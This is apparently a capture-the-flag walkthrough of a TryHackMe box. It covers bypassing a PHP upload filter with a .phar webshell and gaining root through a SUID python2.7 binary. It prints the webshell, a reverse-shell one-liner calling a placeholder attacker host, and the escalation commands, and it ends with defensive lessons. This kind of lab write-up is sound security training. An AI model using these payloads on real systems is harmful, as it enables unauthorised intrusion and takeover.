RootMe is an Easy Linux box from TryHackMe that pairs the two most common beginner findings into one clean chain. A file-upload panel blocks the `.php` extension but not the *other* extensions Apache still hands to the PHP interpreter, so a webshell uploaded as `.phar` executes and gives a shell as `www-data`. From there, a single SUID binary — `python2.7` — is a textbook GTFOBins jump straight to root.

### Web Enumeration — The Upload Panel

`/panel/` is a file-upload form, and `/uploads/` is where the submitted files land — with **directory listing enabled**, so anything accepted is reachable at a predictable URL. That pairing is the whole attack surface: a place to write a file, and a place to reach and execute it. Wappalyzer confirms the stack is PHP, which decides what kind of file is worth uploading — a PHP webshell that runs a command from a query-string parameter:

```php
<?php system($_GET['cmd']); ?>
```

## Initial Access — Unrestricted File Upload (`.phar` bypass) as `www-data`

Uploading `shell.php` through the panel is rejected — there's an extension filter — so the request goes through Burp Suite to see and tamper with it:

![Burp Suite showing the upload of shell.php being rejected by the panel's extension filter](/assets/img/THM/RootMe/cap1.png)

The key insight is that Apache decides whether to *execute* a file by its extension, and `mod_php` is typically registered for several of them, not just `.php` — `.phtml`, `.php3`/`.php4`/`.php5`/`.php7`, `.pht` and `.phar` among them. An upload filter that only denies `.php` leaves those alternates open, so the move is to fuzz the extension in Burp until one is both *accepted by the filter* and *executed by Apache*:

```text
.phtml  .php3  .php4  .php5  .php7  .phps  .php-s  .pht  .phar
```

![Burp Suite Repeater trying the alternate PHP extensions; .phar is accepted and served as PHP](/assets/img/THM/RootMe/cap2.png)

`.phar` — PHP's archive format, which the interpreter runs like any script — is the one that both slips past the filter and executes:

```bash
curl http://10.129.182.69/uploads/shell.phar?cmd=whoami
```

```bash
www-data
```

To upgrade the webshell into an interactive session, the bash reverse-shell one-liner is URL-encoded first so its metacharacters survive the query string:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![The bash reverse-shell one-liner being URL-encoded before it is sent through the cmd parameter](/assets/img/THM/RootMe/cap3.png)

With a listener ready, firing the encoded payload lands the shell:

```bash
curl http://10.129.182.69/uploads/shell.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3CATTACKER_IP%3E%2F4444%200%3E%261%27
```

## Privilege Escalation — `www-data` → `root`

The first thing to check from any shell is which binaries carry the SUID bit — they run with their owner's privileges regardless of who launches them. Here the list is unusually short, and that single entry is the whole escalation:

```bash
www-data@ip-10-129-182-69:/var/www$ find / -perm -4000 2>/dev/null
/usr/bin/python2.7
```

A SUID interpreter is as good as a SUID shell: if Python runs as root, anything Python launches can too. The GTFOBins one-liner for a SUID `python` uses `os.execl` to replace the process with a shell, and `sh -p` keeps the elevated effective UID instead of dropping it:

```bash
www-data@ip-10-129-182-69:/var/www$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# cat /root/root.txt
REDACTED
```

## Key Takeaways

- **An upload filter has to agree with the web server about what "PHP" means.** The panel blocked `.php`, but Apache still executed `.phar` — so the two disagreed, and that gap was the whole foothold. The safe design is an *allowlist* of harmless extensions plus storing uploads outside the web root (or somewhere the server won't execute them), not a denylist chasing every PHP alias.
- **Directory listing turns a blind upload into a reliable one.** Being able to browse `/uploads/` meant the webshell's URL was known the instant it was accepted — write primitive and read-back handed over together.
- **Fingerprint the stack before choosing a payload.** The `PHPSESSID` cookie and Wappalyzer both said PHP; without that, uploading a PHP webshell would have been a guess. Recon narrows the payload to the one thing that will actually execute.
- **A SUID interpreter is a SUID shell.** `python2.7` was never meant to run privileged, but with the SUID bit it hands root to anything it executes. Interpreters, editors and language runtimes on a SUID list (`python`, `perl`, `vim`, `find`) are immediate red flags — nothing outside the standard set should carry it.
- **`-p` is the detail that makes it work.** Both `os.execl(... "sh", "-p")` and the shells behind it rely on `-p` to *not* drop privileges on startup; without it, the shell would helpfully reset to `www-data` and the escalation would silently fail.
